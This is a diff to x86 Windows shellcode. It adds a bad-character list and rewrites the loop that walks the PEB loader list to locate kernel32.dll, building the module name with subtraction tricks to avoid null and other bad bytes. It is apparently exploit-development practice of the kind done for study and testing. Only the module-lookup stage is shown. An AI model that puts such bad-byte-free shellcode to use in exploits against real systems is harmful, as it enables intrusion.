@@ -1,3 +1,5 @@
+badchars = b"\x00\x02\x0A\x0D\x20\x80"
+
 start:                                   #
     # int3                              #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
     mov     ebp, esp                      #
@@ -11,42 +13,46 @@ find_kernel32:                           #
     mov     esi,[esi+0x1C]                #   ESI = PEB->Ldr.InInitOrder
 
 next_module:                        # Loop through modules until 'kernel32.dll'
-    mov   ebx, [esi+0x8];             # EBX = InInitializationOrder[i].base_address
-    mov   edi, [esi+0x20];            # EDI = InInitializationOrder[i].module_name
-    mov   esi, [esi];                 # ESI = InInitializationOrder[i].flink (next)
+    mov   ebx, [esi+0x8]             # EBX = InInitializationOrder[i].base_address
+    push  esi
+    add   esi, 0x10
+    add   esi, 0x10
+    mov   edi, [esi]            # EDI = InInitializationOrder[i].module_name
+    pop   esi
+    mov   esi, [esi]                 # ESI = InInitializationOrder[i].flink (next)
 
-    cmp   [edi+12*2], cx;             # Check null byte terminator (cx = 0x00)
-    jne   next_module;                # No: try next module.
+    cmp   [edi+12*2], cx             # Check null byte terminator (cx = 0x00)
+    jne   next_module                # No: try next module.
 
-    mov   eax, 0x11111111;          
-    sub   eax, 0x10cc10c6;            # EAX = 'KE'
-    cmp   [edi], eax;                 # Compare EAX with first 2 chars of module_name
-    jne   next_module;                # No: try next module.
+    mov   eax, 0x11111111          
+    sub   eax, 0x10cc10c6            # EAX = 'KE'
+    cmp   [edi], eax                 # Compare EAX with first 2 chars of module_name
+    jne   next_module                # No: try next module.
 
-    mov   eax, 0x11111111;          
-    sub   eax, 0x10c310bf;            # EAX = 'RN'
-    cmp   [edi+2*2], eax;             # Compare EAX with next 2 chars of module_name
-    jne   next_module;                # No: try next module.
+    mov   eax, 0x11111111          
+    sub   eax, 0x10c310bf            # EAX = 'RN'
+    cmp   [edi+2*2], eax             # Compare EAX with next 2 chars of module_name
+    jne   next_module                # No: try next module.
 
-    mov   eax, 0x11111111;          
-    sub   eax, 0x10c510cc;            # EAX = 'EL'
-    cmp   [edi+4*2], eax;             # Compare EAX with next 2 chars of module_name
-    jne   next_module;                # No: try next module.
+    mov   eax, 0x11111111          
+    sub   eax, 0x10c510cc            # EAX = 'EL'
+    cmp   [edi+4*2], eax             # Compare EAX with next 2 chars of module_name
+    jne   next_module                # No: try next module.
 
-    mov   eax, 0x11111111;          
-    sub   eax, 0x10df10de;            # EAX = '32'
-    cmp   [edi+6*2], eax;             # Compare EAX with next 2 chars of module_name
-    jne   next_module;                # No: try next module.
+    mov   eax, 0x11111111          
+    sub   eax, 0x10df10de            # EAX = '32'
+    cmp   [edi+6*2], eax             # Compare EAX with next 2 chars of module_name
+    jne   next_module                # No: try next module.
 
-    mov   eax, 0x11111111;          
-    sub   eax, 0x10cd10e3;            # EAX = '.D'
-    cmp   [edi+8*2], eax;             # Compare EAX with next 2 chars of module_name
-    jne   next_module;                # No: try next module.
+    mov   eax, 0x11111111          
+    sub   eax, 0x10cd10e3            # EAX = '.D'
+    cmp   [edi+8*2], eax             # Compare EAX with next 2 chars of module_name
+    jne   next_module                # No: try next module.
 
-    mov   eax, 0x11111111;          
-    sub   eax, 0x10c510c5;            # EAX = 'LL'
-    cmp   [edi+10*2], eax;            # Compare EAX with next 2 chars of module_name
-    jne   next_module;                # No: try next module.
+    mov   eax, 0x11111111          
+    sub   eax, 0x10c510c5            # EAX = 'LL'
+    cmp   [edi+10*2], eax            # Compare EAX with next 2 chars of module_name
+    jne   next_module                # No: try next module.
 
 find_function_shorten:                   #
     jmp     find_function_shorten_bnc       #   Short jump
